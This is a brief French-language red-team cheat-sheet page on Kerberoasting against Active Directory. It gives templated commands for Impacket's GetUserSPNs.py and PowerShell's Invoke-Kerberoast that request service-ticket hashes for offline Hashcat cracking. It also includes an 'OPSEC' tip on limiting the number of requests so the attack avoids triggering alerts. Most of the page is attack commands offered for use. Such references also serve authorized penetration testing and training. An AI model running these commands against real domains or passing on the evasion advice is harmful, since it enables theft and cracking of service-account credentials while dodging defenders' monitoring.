---
title: Kerberoasting
tags: [AD, hash, spn]
os: [Windows]
difficulty: Intermediate
---

Kerberoasting permet d'extraire des hash de service pour des attaques offline.

!!! tip "Astuce"
    Vérifie que l'horloge est synchronisée avec le contrôleur de domaine.

=== "bash"
    ```bash
    GetUserSPNs.py -request -dc-ip {{ target_ip }} {{ domain }}/user:password
    ```

=== "pwsh"
    ```pwsh
    Invoke-Kerberoast -Domain {{ domain }} -OutputFormat Hashcat
    ```

!!! opsec "OPSEC"
    Évite de déclencher des alertes en limitant le nombre de requêtes.
